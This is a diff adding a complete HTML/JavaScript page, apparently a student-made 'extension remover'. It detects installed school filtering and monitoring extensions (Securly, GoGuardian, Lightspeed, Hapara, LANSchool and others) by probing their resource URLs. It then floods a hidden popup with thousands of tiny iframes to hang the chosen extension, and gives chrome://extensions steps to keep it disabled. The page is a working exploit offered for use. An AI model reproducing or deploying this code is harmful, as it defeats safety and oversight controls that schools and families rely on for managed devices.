@@ -1,0 +1,565 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Extension Manager</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap">
+  <style>
+    :root {
+      --primary: #4f46e5;
+      --primary-hover: #4338ca;
+      --danger: #ef4444;
+      --danger-hover: #b91c1c;
+      --dark: #1f2937;
+      --light: #f9fafb;
+      --text: #374151;
+      --gray: #9ca3af;
+      --border: #e5e7eb;
+      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: var(--light);
+      color: var(--text);
+      line-height: 1.6;
+    }
+    
+    header {
+      background-color: var(--dark);
+      color: white;
+      padding: 20px;
+      text-align: center;
+      box-shadow: var(--shadow);
+    }
+    
+    .header-content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+    
+    .logo {
+      width: 40px;
+      height: 40px;
+      background-color: var(--primary);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 20px;
+    }
+    
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 30px;
+      background: white;
+      box-shadow: var(--shadow);
+      border-radius: 12px;
+    }
+    
+    .card {
+      background: white;
+      padding: 24px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      box-shadow: var(--shadow);
+      border: 1px solid var(--border);
+    }
+    
+    h1 {
+      font-size: 24px;
+      margin-bottom: 8px;
+      color: var(--dark);
+    }
+    
+    h2 {
+      font-size: 20px;
+      margin-bottom: 16px;
+      color: var(--dark);
+    }
+    
+    .description {
+      color: var(--gray);
+      margin-bottom: 24px;
+      font-size: 15px;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+    }
+    
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: var(--dark);
+    }
+    
+    select, input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      font-family: 'Poppins', sans-serif;
+      font-size: 15px;
+      transition: border-color 0.2s ease;
+    }
+    
+    select:focus, input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+    }
+    
+    .range-container {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    
+    input[type="range"] {
+      flex-grow: 1;
+    }
+    
+    .range-value {
+      min-width: 60px;
+      text-align: center;
+      font-weight: 500;
+      padding: 4px 12px;
+      background: var(--light);
+      border-radius: 12px;
+      font-size: 14px;
+    }
+    
+    .button-group {
+      display: flex;
+      gap: 12px;
+      margin-top: 24px;
+    }
+    
+    button {
+      font-family: 'Poppins', sans-serif;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    
+    .btn-primary {
+      background-color: var(--primary);
+      color: white;
+      flex-grow: 1;
+    }
+    
+    .btn-primary:hover {
+      background-color: var(--primary-hover);
+    }
+    
+    .btn-danger {
+      background-color: var(--danger);
+      color: white;
+      display: none;
+      flex-grow: 1;
+    }
+    
+    .btn-danger:hover {
+      background-color: var(--danger-hover);
+    }
+    
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      flex-direction: column;
+    }
+    
+    .overlay-content {
+      color: white;
+      text-align: center;
+      max-width: 500px;
+      padding: 20px;
+    }
+    
+    .spinner {
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top: 4px solid white;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 24px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .progress {
+      width: 100%;
+      max-width: 300px;
+      background-color: rgba(255, 255, 255, 0.2);
+      height: 8px;
+      border-radius: 4px;
+      margin: 12px auto;
+      overflow: hidden;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background-color: white;
+      transition: width 0.5s ease;
+    }
+    
+    .result-card {
+      background: white;
+      padding: 24px;
+      border-radius: 8px;
+      margin-top: 24px;
+      display: none;
+      border-left: 4px solid var(--primary);
+    }
+    
+    .status-text {
+      font-size: 18px;
+      margin-bottom: 12px;
+    }
+    
+    .instruction-list {
+      text-align: left;
+      margin-top: 16px; 
+      padding-left: 24px;
+    }
+    
+    .instruction-list li {
+      margin-bottom: 8px;
+    }
+    
+    code {
+      background-color: var(--light);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
+      font-size: 14px;
+    }
+    
+    footer {
+      background-color: var(--dark);
+      color: white;
+      text-align: center;
+      padding: 16px;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      font-size: 14px;
+    }
+    
+    footer a {
+      color: var(--primary);
+      text-decoration: none;
+    }
+    
+    @media (max-width: 768px) {
+      .container {
+        margin: 20px 16px;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-content">
+    <div>
+      <h1>ZXS EXT REMOVER</h1>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+  <div class="card" id="setupCard">
+    <h2>ZXS EXTENSION REMOVER</h2>
+    <p class="description">Select the extension you want to test and configure the parameters.</p>
+    
+    <div class="form-group">
+      <label for="iframeSelect">Select Extension:</label>
+      <select id="iframeSelect">
+        <option value="">Loading extensions...</option>
+      </select>
+    </div>
+    
+    <div class="form-group">
+      <label for="iframeCount">Number of iFrames:</label>
+      <div class="range-container">
+        <input type="range" id="iframeCount" min="100" max="2000" step="100" value="1000">
+        <span class="range-value" id="iframeCountValue">1000</span>
+      </div>
+      <p class="description">Higher values may cause more strain on the browser but may be more effective.</p>
+    </div>
+    
+    <div class="button-group">
+      <button class="btn-primary" id="hangButton" onclick="startProcess()">Start Process</button>
+      <button class="btn-danger" id="killButton" onclick="openExtensionPopup()">Complete Process</button>
+    </div>
+  </div>
+  
+  <div class="result-card" id="resultCard">
+    <div class="status-text" id="statusText">Extension process completed</div>
+    <div id="resultContent"></div>
+  </div>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="overlay-content">
+    <div class="spinner"></div>
+    <h2 id="overlayTitle">Processing Extension</h2>
+    <p id="overlayDescription">This may take about a minute. Please wait...</p>
+    <div class="progress">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+  </div>
+</div>
+
+<footer>
+  Extension Manager • Enhanced UI Version
+</footer>
+
+<script>
+  // Update iframe count display when slider changes
+  const iframeCountInput = document.getElementById('iframeCount');
+  const iframeCountValue = document.getElementById('iframeCountValue');
+  
+  iframeCountInput.addEventListener('input', function() {
+    iframeCountValue.textContent = this.value;
+  });
+
+  async function checkExtensionURL(url) {
+    try {
+      const response = await fetch(url);
+      if (response.ok) {
+        return true;
+      } else {
+        return false;
+      }
+    } catch (error) {
+      return false;
+    }
+  }
+
+  async function populateSelectOptions() {
+    const selectElement = document.getElementById("iframeSelect");
+    selectElement.innerHTML = ''; // Clear loading option
+    
+    const extensions = {
+      "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
+      "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
+      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
+      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
+      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
+      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
+      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
+      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
+      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
+      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
+      "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
+      "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
+      "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
+      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
+      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
+      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
+      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
+      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
+      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
+      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
+      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
+      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
+      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
+      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
+      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
+    };
+    
+    let hasSupportedExtensions = false;
+
+    for (const [name, url] of Object.entries(extensions)) {
+      if (await checkExtensionURL(url)) {
+        const option = document.createElement("option");
+        option.value = url;
+        option.textContent = name;
+        selectElement.appendChild(option);
+        hasSupportedExtensions = true;
+      }
+    }
+    
+    if (!hasSupportedExtensions) {
+      const option = document.createElement("option");
+      option.value = "";
+      option.textContent = "No supported extensions installed";
+      selectElement.appendChild(option);
+      document.getElementById("hangButton").disabled = true;
+    }
+  }
+
+  // Initialize the page
+  populateSelectOptions();
+  
+  function replaceIframes(container, iframeSrc, iframeCount) {
+    const count = parseInt(iframeCount);
+    for (let i = 0; i < count; i++) {
+      const iframe = document.createElement('iframe');
+      iframe.src = iframeSrc;
+      iframe.style.width = '1px';
+      iframe.style.height = '1px';
+      iframe.style.opacity = '0.01';
+      iframe.style.position = 'absolute';
+      container.appendChild(iframe);
+    }
+    
+    setTimeout(function() {
+      while (container.firstChild) {
+        container.removeChild(container.firstChild);
+      }
+      replaceIframes(container, iframeSrc, iframeCount);
+    }, 5);
+  }
+
+  function updateProgressBar(percent) {
+    const progressBar = document.getElementById('progressBar');
+    progressBar.style.width = percent + '%';
+  }
+
+  function startProcess() {
+    const overlay = document.getElementById("overlay");
+    overlay.style.display = "flex";
+    
+    const iframeSelect = document.getElementById("iframeSelect");
+    const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
+    const selectedSrc = iframeSelect.value;
+    const iframeCount = document.getElementById("iframeCount").value;
+    
+    // Start progress animation
+    let progress = 0;
+    const progressInterval = setInterval(() => {
+      progress += 2;
+      if (progress <= 100) {
+        updateProgressBar(progress);
+      } else {
+        clearInterval(progressInterval);
+      }
+    }, 500);
+    
+    const popup = window.open("", "ProcessWindow", "width=100,height=100");
+    const popupDocument = popup.document;
+    const popupBody = popupDocument.body;
+    
+    // Set background to black to make it less visible
+    popupBody.style.backgroundColor = "black";
+    popupBody.style.margin = "0";
+    popupBody.style.overflow = "hidden";
+    
+    const iframeContainer = popupDocument.createElement('div');
+    iframeContainer.id = 'iframeContainer';
+    popupBody.appendChild(iframeContainer);
+    
+    // Start the iframe replacement process
+    replaceIframes(iframeContainer, selectedSrc, iframeCount);
+    
+    // After a timeout, close popup and show next steps
+    setTimeout(function() {
+      popup.close();
+      const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
+      
+      // Update UI to show the next step
+      document.getElementById("hangButton").style.display = "none";
+      document.getElementById("killButton").style.display = "block";
+      document.getElementById("killButton").setAttribute("data-url", selectedSrc);
+      document.getElementById("killButton").setAttribute("data-id", extensionId);
+      
+      // Update overlay
+      document.getElementById("overlayTitle").textContent = "Process Initiated";
+      document.getElementById("overlayDescription").textContent = "Extension has been processed. Close this overlay to continue.";
+      updateProgressBar(100);
+      
+      // Add button to close overlay
+      const closeButton = document.createElement("button");
+      closeButton.textContent = "Continue";
+      closeButton.style.marginTop = "20px";
+      closeButton.style.padding = "10px 20px";
+      closeButton.style.backgroundColor = "white";
+      closeButton.style.color = "#1f2937";
+      closeButton.style.border = "none";
+      closeButton.style.borderRadius = "4px";
+      closeButton.style.cursor = "pointer";
+      closeButton.style.fontWeight = "500";
+      closeButton.onclick = function() {
+        overlay.style.display = "none";
+        
+        // Show result card with instructions
+        const resultCard = document.getElementById("resultCard");
+        resultCard.style.display = "block";
+        const resultContent = document.getElementById("resultContent");
+        resultContent.innerHTML = `
+          <p>The extension "<strong>${selectedOption}</strong>" has been processed. Click the "Complete Process" button to finish.</p>
+        `;
+      };
+      
+      document.querySelector(".overlay-content").appendChild(closeButton);
+      
+    }, 8000);
+  }
+
+  function openExtensionPopup() {
+    const killButton = document.getElementById("killButton");
+    const selectedSrc = killButton.getAttribute("data-url");
+    const extensionId = killButton.getAttribute("data-id");
+    
+    // Update result card with instructions
+    const resultCard = document.getElementById("resultCard");
+    const resultContent = document.getElementById("resultContent");
+    document.getElementById("statusText").textContent = "Follow these instructions to complete the process:";
+    
+    resultContent.innerHTML = `
+      <ol class="instruction-list">
+        <li>Keep this tab open</li>
+        <li>In a new tab, open <code>chrome://extensions/?id=${extensionId}</code></li>
+        <li>Find the switch labeled "Allow access to file URLs" and toggle it twice</li>
+        <li>The extension should now be disabled</li>
+        <li>If you want to restore the extension later, toggle the "Allow access to file URLs" switch again</li>
+      </ol>
+    `;
+    
+    killButton.style.display = "none";
+    
+    // Navigate to the extension URL
+    window.location.href = selectedSrc;
+  }
+</script>
+</body>
+</html>
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   
